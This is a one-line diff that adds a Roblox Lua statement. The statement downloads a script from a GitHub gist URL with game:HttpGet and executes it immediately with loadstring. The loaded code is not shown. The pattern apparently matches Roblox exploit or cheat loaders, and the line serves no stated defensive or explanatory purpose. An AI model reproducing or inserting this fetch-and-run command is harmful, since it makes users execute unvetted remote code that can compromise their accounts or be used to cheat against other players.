@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/yeicobadilla4-arch/b4bae28b1603b4c6c221ee9cb5678b8c/raw"))()
